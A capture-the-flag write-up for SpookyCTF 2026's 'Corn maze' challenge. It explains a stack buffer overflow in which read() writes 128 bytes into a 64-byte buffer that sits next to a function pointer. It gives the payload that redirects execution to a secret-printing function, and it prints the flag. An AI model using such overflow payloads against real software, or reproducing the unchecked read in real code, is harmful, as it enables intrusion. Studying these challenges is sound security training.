# Corn maze — buffer overflow

**Author:** Abhishek Kr Gupta
**Event:** SpookyCTF 2026
**Status:** Platform-confirmed

## Flag

```
spooky{br4v3Se@O77er}
```

## Challenge

A corn-maze game served over TCP (`nc 18.226.103.146 1337`). The binary `main.bin` (source `main.c`) has a classic stack buffer overflow.

## Files

- `challenge-files/main.c` — vulnerable source
- `challenge-files/main.bin` — the binary
- `solvers/corn-maze/corn_maze_exploit.py` — the exploit

## Vulnerability

`vuln()` declares:

```c
char buf[64];
void (*direction)();
```

It initialises `direction` to `center_of_corn_maze`, then does:

```c
read(0, buf, 128);   // 128 bytes into a 64-byte buffer
direction();
```

`read` takes 128 bytes into a 64-byte buffer, and the function pointer sits directly after `buf` on the stack. So 64 bytes of filler overwrite `buf`, and the next 8 bytes overwrite the function pointer. The binary is non-PIE, so function addresses are fixed.

## Exploit

Point the function pointer at `corn_maze_exit` (`0x4011d6`), which prints the secret from `/opt/ctf/chall1/secret.txt`:

```python
payload = b"A" * 64 + struct.pack("<Q", 0x4011D6)
```

The full exploit is `solvers/corn-maze/corn_maze_exploit.py`. It connects, reads the banner, sends the 72-byte payload, and prints the server's response.

## Running it

The solving machine could not reach the service directly (direct TCP was off), so the author ran the exploit on their own machine:

```bash
python3 solvers/corn-maze/corn_maze_exploit.py
```

The server returned the secret value `br4v3Se@O77er`.

## Flag

```
spooky{br4v3Se@O77er}
```

Submitted on the platform and accepted.
